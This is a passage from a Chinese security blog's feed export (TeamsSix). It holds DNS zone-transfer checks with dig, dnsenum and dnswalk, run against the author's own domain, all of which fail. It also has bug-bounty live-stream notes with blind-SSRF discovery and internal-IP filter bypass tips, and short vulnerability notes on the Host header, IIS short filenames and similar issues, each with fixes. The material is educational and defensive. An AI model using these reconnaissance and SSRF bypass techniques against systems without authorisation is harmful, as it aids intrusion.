class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">~# dig teamssix.com ns</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; teamssix.com ns</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 16945</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;teamssix.com.                  IN      NS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">teamssix.com.           5       IN      NS      clint.ns.cloudflare.com.</span><br><span class="line">teamssix.com.           5       IN      NS      isla.ns.cloudflare.com.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;; Query time: 6 msec</span><br><span class="line">;; SERVER: 10.18.37.7#54(10.18.37.7)</span><br><span class="line">;; WHEN: Fri Dec 06 03:30:37 EST 2019</span><br><span class="line">;; MSG SIZE  rcvd: 83</span><br></pre></td></tr></table></figure><p>2、向该域名发送axfr 请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~# dig axfr @clint.ns.cloudflare.com teamssix.com</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; axfr @clint.ns.cloudflare.com teamssix.com</span><br><span class="line">; (3 servers found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">; Transfer failed.</span><br></pre></td></tr></table></figure><h3 id="b、dnsenum"><a href="#b、dnsenum" class="headerlink" title="b、dnsenum"></a>b、dnsenum</h3><p>这个工具相较于之前的方法要为简单，一行命令即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">~# dnsenum -enum teamssix.com</span><br><span class="line"></span><br><span class="line">Smartmatch is experimental at /usr/bin/dnsenum line 698.</span><br><span class="line">Smartmatch is experimental at /usr/bin/dnsenum line 698.</span><br><span class="line">dnsenum VERSION:1.2.4</span><br><span class="line">Warning: can&apos;t load Net::Whois::IP module, whois queries disabled.</span><br><span class="line">Warning: can&apos;t load WWW::Mechanize module, Google scraping desabled.</span><br><span class="line"></span><br><span class="line">-----   teamssix.com   -----</span><br><span class="line"></span><br><span class="line">Host&apos;s addresses:</span><br><span class="line">__________________</span><br><span class="line">teamssix.com.                            5        IN    A        104.28.22.70</span><br><span class="line">teamssix.com.                            5        IN    A        104.28.23.70</span><br><span class="line"></span><br><span class="line">Name Servers:</span><br><span class="line">______________</span><br><span class="line"></span><br><span class="line">isla.ns.cloudflare.com.                  5        IN    A        173.245.58.119</span><br><span class="line">clint.ns.cloudflare.com.                 5        IN    A        173.245.59.90</span><br><span class="line">clint.ns.cloudflare.com.                 5        IN    RRSIG             (</span><br><span class="line"></span><br><span class="line">Mail (MX) Servers:</span><br><span class="line">___________________</span><br><span class="line"></span><br><span class="line">Trying Zone Transfers and getting Bind Versions:</span><br><span class="line">_________________________________________________</span><br><span class="line"></span><br><span class="line">Trying Zone Transfer for teamssix.com on isla.ns.cloudflare.com ...</span><br><span class="line">AXFR record query failed: FORMERR</span><br><span class="line"></span><br><span class="line">Trying Zone Transfer for teamssix.com on clint.ns.cloudflare.com ...</span><br><span class="line">AXFR record query failed: FORMERR</span><br><span class="line"></span><br><span class="line">brute force file not specified, bay.</span><br></pre></td></tr></table></figure><h3 id="c、dnswalk"><a href="#c、dnswalk" class="headerlink" title="c、dnswalk"></a>c、dnswalk</h3><p>dnswalk的使用同样一条命令，但是注意在域名最后加上一个点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~# dnswalk teamssix.com.</span><br><span class="line"></span><br><span class="line">Checking teamssix.com.</span><br><span class="line">Getting zone transfer of teamssix.com. from clint.ns.cloudflare.com...failed</span><br><span class="line">FAIL: Zone transfer of teamssix.com. from clint.ns.cloudflare.com failed: FORMERR</span><br><span class="line">Getting zone transfer of teamssix.com. from isla.ns.cloudflare.com...failed</span><br><span class="line">FAIL: Zone transfer of teamssix.com. from isla.ns.cloudflare.com failed: FORMERR</span><br><span class="line">BAD: All zone transfer attempts of teamssix.com. failed!</span><br><span class="line">2 failures, 0 warnings, 1 errors.</span><br></pre></td></tr></table></figure><h1 id="0x02-修复建议"><a href="#0x02-修复建议" class="headerlink" title="0x02 修复建议"></a>0x02 修复建议</h1><p>区域传送是 DNS 常用的功能，为保证使用安全，应严格限制允许区域传送的主机，例如一个主 DNS 服务器应该只允许它的备用 DNS 服务器执行区域传送功能。</p><p>在相应的 zone、options 中添加 allow-transfer，对执行此操作的服务器进行限制。如：</p><ul><li><p>严格限制允许进行区域传送的客户端的 IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow-transfer ｛1.1.1.1; 2.2.2.2;｝</span><br></pre></td></tr></table></figure></li><li><p>设置 TSIG key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow-transfer ｛key &quot;dns1-slave1&quot;; key &quot;dns1-slave2&quot;;｝</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>最后感谢前辈们的文章与辛勤奉献，DNS域传送漏洞除了本文中讨论的方法外，也可以使用Python脚本或者万能的nmap，这里就不做讨论啦。</p><p>想写这篇文章已经想一周了，今天终于有时间给整理整理，另外前文发布的Pigat工具，最近也会修复一些bug提交到Github更新哒。</p><blockquote><p>更多信息欢迎关注我的个人公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="http://sunu11.com/2017/03/16/8/" target="_blank" rel="noopener">http://sunu11.com/2017/03/16/8/</a><br><a href="https://www.jianshu.com/p/d2af08e6f8fb" target="_blank" rel="noopener">https://www.jianshu.com/p/d2af08e6f8fb</a><br><a href="http://www.lijiejie.com/dns-zone-transfer-1/" target="_blank" rel="noopener">http://www.lijiejie.com/dns-zone-transfer-1/</a><br><a href="https://www.alibabacloud.com/help/zh/faq-detail/37529.htm" target="_blank" rel="noopener">https://www.alibabacloud.com/help/zh/faq-detail/37529.htm</a><br><a href="https://www.lsablog.com/networksec/awd/dns-zone-transfer/" target="_blank" rel="noopener">https://www.lsablog.com/networksec/awd/dns-zone-transfer/</a><br><a href="https://larry.ngrep.me/2015/09/02/DNS-zone-transfer-studying/" target="_blank" rel="noopener">https://larry.ngrep.me/2015/09/02/DNS-zone-transfer-studying/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;注：本文中使用的域名是不存在DNS域传送漏洞的，本文仅用作技术交流学习用途，严禁将该文内容用于违法行为。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="DNS" scheme="https://www.teamssix.com/tags/DNS/"/>
    
      <category term="域传送" scheme="https://www.teamssix.com/tags/%E5%9F%9F%E4%BC%A0%E9%80%81/"/>
    
  </entry>
  
  <entry>
    <title>【直播笔记】白帽子的成长之路</title>
    <link href="https://www.teamssix.com/year/191201-220910.html"/>
    <id>https://www.teamssix.com/year/191201-220910.html</id>
    <published>2019-12-01T14:09:10.000Z</published>
    <updated>2019-12-01T14:11:29.402Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>子域名监听工具：<a href="https://github.com/guimaizi/get_domain，新出来的子域名往往漏洞较多" target="_blank" rel="noopener">https://github.com/guimaizi/get_domain，新出来的子域名往往漏洞较多</a></p></li><li><p>关于挖掘src漏洞:</p></li></ul><ol><li>白帽子主要是寻找扫描器和风控系统覆盖不到的地方，比如domxss、越权漏洞和逻辑漏洞</li><li>开发运维人员的一些疏忽的点<a id="more"></a></li><li>还有因为厂商毕竟是赚钱是第一要务，因双十一、游戏活动之类紧急上线的业务并没有被安全部门测试过，这些通常会出现问题。</li><li>漏洞主要还是存在于交互处，也就是需要表单填写多的地方，这种场景大家应该会时常遇到。</li><li>漏洞利用，这是厂商和当前法律明令禁止的….请参考国外博客，和自己私下测试，还有纯刷src角度，我个人觉得别用扫描器扫厂商业务，他们一个payload打过去,封ip封账号不说，爬虫爬过去说不定你就收到一张传票或者被查水表，就进去了……</li></ol><ul><li><p>学习路径：<a href="https://mp.weixin.qq.com/s/nE8a4Z-qCXwOrvZXE-gLFg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/nE8a4Z-qCXwOrvZXE-gLFg</a></p></li><li><p>SSRF无回显的挖掘方法：<a href="https://mp.weixin.qq.com/s/R-N9e0PfrWY2GluLrjLlww" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/R-N9e0PfrWY2GluLrjLlww</a></p></li></ul><ol><li>基本上useragent是来自容器的 都很大程度上存在这个漏洞</li><li>这个漏洞最简单的挖掘方法就是先尝试一遍外网 判断是否服务器端发起的，再去找该厂商的内网ip或者内网域名</li><li>找到后需要遍历它内网有什么端口</li><li>如果想把它当作内网一样访问资产，可以利用fiddler配置一下就可以了。</li><li>如果它存在不让请求内网的怎么办？可以买一个域名，将域名A解析到它内网ip再做请求，或者利用302跳转，短链接等方式</li></ol><ul><li><p>bypass技巧：<a href="https://mp.weixin.qq.com/s/zIOH1nMe-Ekeo4ga2wDRgw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zIOH1nMe-Ekeo4ga2wDRgw</a></p></li><li><p>关于考证</p></li></ul><ol><li>如果是搞渗透测试方向的话，入门建议OSCP，这是公认的全球最强渗透测试认证资质。考完了也就相当于拥有了渗透测试中级水平，完全可以应对国内大多数渗透测试岗位工作</li><li>cisp-pte、cisp-pts这类国测的证，主要是找投标资质用的，实战意义不是太大</li><li>cisp可以帮助大家更加全面的认真整个信息安全，从宏观上了解我国对于信息安全的政策和相关知识</li></ol><ul><li>[TPSA19-22]SRC行业安全测试规范：<a href="https://security.tencent.com/index.php/announcement/msg/180" target="_blank" rel="noopener">https://security.tencent.com/index.php/announcement/msg/180</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;子域名监听工具：&lt;a href=&quot;https://github.com/guimaizi/get_domain，新出来的子域名往往漏洞较多&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/guimaizi/get_domain，新出来的子域名往往漏洞较多&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;关于挖掘src漏洞:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;白帽子主要是寻找扫描器和风控系统覆盖不到的地方，比如domxss、越权漏洞和逻辑漏洞&lt;/li&gt;
&lt;li&gt;开发运维人员的一些疏忽的点
    
    </summary>
    
      <category term="笔记总结" scheme="https://www.teamssix.com/categories/%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="直播" scheme="https://www.teamssix.com/tags/%E7%9B%B4%E6%92%AD/"/>
    
      <category term="笔记" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="总结" scheme="https://www.teamssix.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="成长之路" scheme="https://www.teamssix.com/tags/%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】Robots.txt站点文件</title>
    <link href="https://www.teamssix.com/year/191127-201447.html"/>
    <id>https://www.teamssix.com/year/191127-201447.html</id>
    <published>2019-11-27T12:14:47.000Z</published>
    <updated>2019-11-27T12:43:53.640Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：Robots.txt站点文件</p><p>风险等级：低</p><p>问题类型：服务器设置问题</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>Robots.txt文件中声明了不想被搜索引擎访问的部分或者指定搜索引擎收录指定的部分。</p><a id="more"></a><p>此信息可以帮助攻击者得到网站部分文件名称、目录名称，了解网站结构。</p><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>攻击者可通过发现robots.txt文件，收集网站的敏感目录或文件，从而有针对性的进行利用。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>1、将敏感的文件和目录放在一个排除搜索引擎访问的目录中</p><p>2、robots.txt内容可设为Disallow: /，禁止搜索引擎访问网站的任何内容</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：Robots.txt站点文件&lt;/p&gt;
&lt;p&gt;风险等级：低&lt;/p&gt;
&lt;p&gt;问题类型：服务器设置问题&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;Robots.txt文件中声明了不想被搜索引擎访问的部分或者指定搜索引擎收录指定的部分。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Robots.txt" scheme="https://www.teamssix.com/tags/Robots-txt/"/>
    
      <category term="服务器设置问题" scheme="https://www.teamssix.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AE%BE%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】Host头攻击</title>
    <link href="https://www.teamssix.com/year/191127-201443.html"/>
    <id>https://www.teamssix.com/year/191127-201443.html</id>
    <published>2019-11-27T12:14:43.000Z</published>
    <updated>2019-11-27T12:43:48.304Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：Host头攻击</p><p>风险等级：低</p><p>问题类型：管理员设置问题</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>Host首部字段是HTTP/1.1新增的，旨在告诉服务器，客户端请求的主机名和端口号，主要用来实现虚拟主机技术。</p><a id="more"></a><p>运用虚拟主机技术，单个主机可以运行多个站点。</p><p>例如：hacker和usagidesign两个站点都运行在同一服务器A上，不管我们请求哪个域名，最终都会被解析成服务器A的IP地址，这个时候服务器就不知道该将请求交给哪个站点处理，因此需要Host字段指定请求的主机名。</p><p>我们访问hacker域名，经DNS解析，变成了服务器A的IP，请求传达到服务器A，A接收到请求后，发现请求报文中的Host字段值为hacker，进而将请求交给hacker站点处理。</p><p>这个时候，问题就出现了。为了方便获取网站域名，开发人员一般依赖于请求包中的Host首部字段。例如，在php里用_SERVER[“HTTP_HOST”]，但是这个Host字段值是不可信赖的(可通过HTTP代理工具篡改)。</p><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>如果应用程序没有对Host字段值进行处理，就有可能造成恶意代码的传入。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>对Host字段进行检测</p><p>Nginx，修改ngnix.conf文件，在server中指定一个server_name名单，并添加检测。</p><p>Apache，修改httpd.conf文件，指定ServerName，并开启UseCanonicalName选项。</p><p>Tomcat，修改server.xml文件，配置Host的name属性。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://www.jianshu.com/p/690acbf9f321" target="_blank" rel="noopener">https://www.jianshu.com/p/690acbf9f321</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：Host头攻击&lt;/p&gt;
&lt;p&gt;风险等级：低&lt;/p&gt;
&lt;p&gt;问题类型：管理员设置问题&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;Host首部字段是HTTP/1.1新增的，旨在告诉服务器，客户端请求的主机名和端口号，主要用来实现虚拟主机技术。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="管理员设置问题" scheme="https://www.teamssix.com/tags/%E7%AE%A1%E7%90%86%E5%91%98%E8%AE%BE%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    
      <category term="Host头" scheme="https://www.teamssix.com/tags/Host%E5%A4%B4/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】常见的HTTP方法</title>
    <link href="https://www.teamssix.com/year/191127-201438.html"/>
    <id>https://www.teamssix.com/year/191127-201438.html</id>
    <published>2019-11-27T12:14:38.000Z</published>
    <updated>2019-11-27T12:43:42.903Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>根据HTTP标准，HTTP请求可以使用多种请求方法。</p><p>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。</p><p>HTTP1.1新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT方法。</p><a id="more"></a><h1 id="0x01-GET"><a href="#0x01-GET" class="headerlink" title="0x01 GET"></a>0x01 GET</h1><p>GET方法用于请求指定的页面信息，并返回实体主体。</p><h1 id="0x02-HEAD"><a href="#0x02-HEAD" class="headerlink" title="0x02 HEAD"></a>0x02 HEAD</h1><p>HEAD方法请求一个与GET请求的响应相同的响应，但没有响应体。</p><h1 id="0x03-POST"><a href="#0x03-POST" class="headerlink" title="0x03 POST"></a>0x03 POST</h1><p>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。</p><p>数据被包含在请求体中，POST请求可能会导致新的资源建立或已有资源的修改。</p><h1 id="0x04-PUT"><a href="#0x04-PUT" class="headerlink" title="0x04 PUT"></a>0x04 PUT</h1><p>PUT方法用请求有效载荷替换目标资源的所有当前表示。</p><h1 id="0x05-DELETE"><a href="#0x05-DELETE" class="headerlink" title="0x05 DELETE"></a>0x05 DELETE</h1><p>请求服务器删除指定的页面。</p><h1 id="0x06-CONNECT"><a href="#0x06-CONNECT" class="headerlink" title="0x06 CONNECT"></a>0x06 CONNECT</h1><p>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</p><h1 id="0x07-OPTIONS"><a href="#0x07-OPTIONS" class="headerlink" title="0x07 OPTIONS"></a>0x07 OPTIONS</h1><p>允许客户端查看服务器的性能。</p><h1 id="0x08-TRACE"><a href="#0x08-TRACE" class="headerlink" title="0x08 TRACE"></a>0x08 TRACE</h1><p>回显服务器收到的请求，主要用于测试或诊断。</p><h1 id="0x09-PATCH"><a href="#0x09-PATCH" class="headerlink" title="0x09 PATCH"></a>0x09 PATCH</h1><p>是对PUT方法的补充，用来对已知资源进行局部更新。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://www.runoob.com/http/http-methods.html" target="_blank" rel="noopener">https://www.runoob.com/http/http-methods.html</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;根据HTTP标准，HTTP请求可以使用多种请求方法。&lt;/p&gt;
&lt;p&gt;HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。&lt;/p&gt;
&lt;p&gt;HTTP1.1新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT方法。&lt;/p&gt;
    
    </summary>
    
      <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
      <category term="HTTP方法" scheme="https://www.teamssix.com/tags/HTTP%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】ASP.NET允许文件调试</title>
    <link href="https://www.teamssix.com/year/191126-215809.html"/>
    <id>https://www.teamssix.com/year/191126-215809.html</id>
    <published>2019-11-26T13:58:09.000Z</published>
    <updated>2019-11-26T14:21:57.058Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：ASP.NET允许文件调试</p><p>风险等级：低</p><p>问题类型：管理员设置问题</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>发送DEBUG动作的请求，如果服务器返回内容为OK，那么服务器就开启了调试功能，可能会导致有关Web应用程序的敏感信息泄露，例如密码、路径等。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>可能会泄露密码、路径等敏感信息。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>编辑Web.config文件，设置<code>&amp;lt;compilation debug=&quot;false&quot;/&amp;gt;</code></p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：ASP.NET允许文件调试&lt;/p&gt;
&lt;p&gt;风险等级：低&lt;/p&gt;
&lt;p&gt;问题类型：管理员设置问题&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;发送DEBUG动作的请求，如果服务器返回内容为OK，那么服务器就开启了调试功能，可能会导致有关Web应用程序的敏感信息泄露，例如密码、路径等。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="ASP.NET" scheme="https://www.teamssix.com/tags/ASP-NET/"/>
    
      <category term="管理员设置问题" scheme="https://www.teamssix.com/tags/%E7%AE%A1%E7%90%86%E5%91%98%E8%AE%BE%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】IIS短文件名泄露</title>
    <link href="https://www.teamssix.com/year/191126-215804.html"/>
    <id>https://www.teamssix.com/year/191126-215804.html</id>
    <published>2019-11-26T13:58:04.000Z</published>
    <updated>2019-11-26T14:15:42.799Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：IIS短文件名泄露</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>此漏洞实际是由HTTP请求中旧DOS 8.3名称约定（SFN）的代字符（〜）波浪号引起的。</p><a id="more"></a><p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名。</p><p>Microsoft IIS 波浪号造成的信息泄露是世界网络范围内最常见的中等风险漏洞。这个问题至少从1990年开始就已经存在，但是已经证明难以发现，难以解决或容易被完全忽略。</p><p><strong>受影响的版本：</strong><br>IIS 1.0，Windows NT 3.51<br>IIS 3.0，Windows NT 4.0 Service Pack 2<br>IIS 4.0，Windows NT 4.0选项包<br>IIS 5.0，Windows 2000<br>IIS 5.1，Windows XP Professional和Windows XP Media Center Edition<br>IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition<br>IIS 7.0，Windows Server 2008和Windows Vista<br>IIS 7.5，Windows 7（远程启用<customerrors>或没有web.config）<br>IIS 7.5，Windows 2008（经典管道模式）<br>注意：IIS使用.Net Framework 4时不受影响</customerrors></p><p><strong>漏洞的局限性：</strong><br>1) 只能猜解前六位，以及扩展名的前3位。<br>2) 名称较短的文件是没有相应的短文件名的。<br>3）需要IIS和.net两个条件都满足。</p><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p><strong>主要危害：利用“~”字符猜解暴露短文件/文件夹名</strong></p><p>由于短文件名的长度固定（xxxxxx~xxxx），因此黑客可直接对短文件名进行暴力破解 ，从而访问对应的文件。</p><p>举个例子，有一个数据库备份文件 backup_<a href="http://www.abc.com_20150101.sql" target="_blank" rel="noopener">www.abc.com_20150101.sql</a> ，它对应的短文件名是 backup<del>1.sql 。因此黑客只要暴力破解出backup</del>1.sql即可下载该文件，而无需破解完整的文件名。</p><p>*<em>次要危害：.Net Framework的拒绝服务攻击 *</em></p><p>攻击者如果在文件夹名称中发送一个不合法的.Net文件请求，.NeFramework将递归搜索所有的根目录，消耗网站资源进而导致DOS问题。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>1、CMD关闭NTFS 8.3文件格式的支持</p><p>2、修改注册表禁用短文件名功能</p><p>3、关闭Web服务扩展- ASP.NET</p><p>4、升级netFramework至4.0以上版本</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://www.freebuf.com/articles/web/172561.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/172561.html</a><br><a href="https://segmentfault.com/a/1190000006225568" target="_blank" rel="noopener">https://segmentfault.com/a/1190000006225568</a></p></blockquote>]]></content>
    
    <summary type="html">
    
